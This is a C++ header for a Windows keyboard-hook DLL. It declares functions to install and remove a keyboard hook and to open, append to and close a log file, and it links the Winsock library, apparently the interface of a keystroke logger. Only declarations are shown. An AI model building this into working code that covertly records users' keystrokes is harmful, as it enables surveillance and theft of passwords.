#pragma once

#pragma comment(lib, "Ws2_32.lib")

#include <fstream>
// #include <WinUser.h>

#ifdef KEYBOARDHOOK_EXPORTS
#define KEYBOARDHOOK_API __declspec(dllexport)
#else
#define KEYBOARDHOOK_API __declspec(dllimport)
#endif

extern "C" KEYBOARDHOOK_API unsigned int testFunction();

typedef void (*YOUR_CALLBACK)(char myChar);
extern "C" KEYBOARDHOOK_API int installhook();

extern "C" KEYBOARDHOOK_API int UnHook();

extern "C" KEYBOARDHOOK_API FILE* openLogFile(const char filePath[]);

extern "C" KEYBOARDHOOK_API void appendToFile(const char content[]);

extern "C" KEYBOARDHOOK_API int closeLogFile();

extern "C" KEYBOARDHOOK_API unsigned int testFunction();